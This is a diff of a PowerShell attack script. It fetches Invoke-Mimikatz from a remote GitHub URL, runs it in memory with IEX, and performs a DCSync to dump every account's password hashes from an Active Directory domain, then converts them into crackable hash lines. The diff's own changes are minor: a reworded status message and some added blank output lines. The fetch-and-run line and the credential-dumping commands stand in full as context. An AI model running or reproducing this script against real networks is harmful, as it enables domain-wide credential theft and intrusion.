@@ -10,7 +10,7 @@ $Domain = $env:USERDNSDOMAIN
 Write-Host "[-] Downloading Mimikatz into Memory" -ForegroundColor Cyan
 IEX(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
-Write-Host "[-] DCSync will be executed for the domain: $domain" -ForegroundColor Cyan
+Write-Host "[-] DCSync will be executed again the Domain: $domain" -ForegroundColor Cyan
 
     Write-Host "[!] Executing Mimikatz." -ForegroundColor Yellow
     $Command = '"log ' + $LOGFILE + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
@@ -42,5 +42,9 @@ foreach ($line in $file_content) {
     $new_line = $line -replace ",", "::aad3b435b51404eeaad3b435b51404ee:"
     $new_line += ":::"
     Write-Output $new_line
+    Write-Host ""
+    Write-Host ""
+    Write-Host ""
+    Write-Host ""
 }
 
